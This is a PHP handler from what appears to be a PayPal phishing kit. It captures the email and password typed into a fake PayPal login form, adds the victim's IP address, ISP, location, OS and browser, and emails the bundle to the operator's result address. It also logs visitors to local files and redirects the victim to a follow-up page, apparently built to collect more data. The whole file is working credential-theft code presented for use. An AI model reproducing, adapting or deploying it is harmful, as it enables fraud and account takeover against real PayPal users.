<?php
error_reporting(0);
session_start();
require_once '../main.php';
require_once 'session.php';
if($_POST['login_email'] == "") {
	exit();
}
$ip = getUserIP();
$message  = "#--------------------[ PAYPAL LOGIN ]-------------------------#\n";
$message .= "User ID		: ".$_POST['login_email']."\n";
$message .= "Password		: ".$_POST['login_password']."\n";
$message .= "#--------------------------[ PC INFORMATION ]-------------------------#\n";
$message .= "IP Address		: ".$ip."\n";
$message .= "ISP		    : ".$ispuser."\n";
$message .= "Region		    : ".$regioncity."\n";
$message .= "City		    : ".$citykota."\n";
$message .= "Continent		: ".$continent."\n";
$message .= "Timezone		: ".$timezone."\n";
$message .= "OS/Browser		: ".$os." / ".$br."\n";
$message .= "Date			: ".$date."\n";
$message .= "User Agent		: ".$user_agent."\n";
$message .= "#--------------------------[ PRIVATE ]-----------------------------#\n";
$_SESSION['login_email'] = $_POST['login_email'];
$_SESSION['login_password'] = $_POST['login_password'];
$subject = "PAYPAL LOGIN: ".$_POST['login_email']." [ $cn - $os - $ip ]";
if($setting['send_login'] == "on") {
kirim_mail($setting['email_result'], "PAYPAL ACCOUNT", $subject, $message);
}
tulis_file("../result/total_login.txt", $ip);
tulis_file("../result/log_visitor.txt", "[$time - $ip - $countryname - $br - $os] Login Paypal");
echo "<script type='text/javascript'>window.top.location='unusual?key=$key';</script>";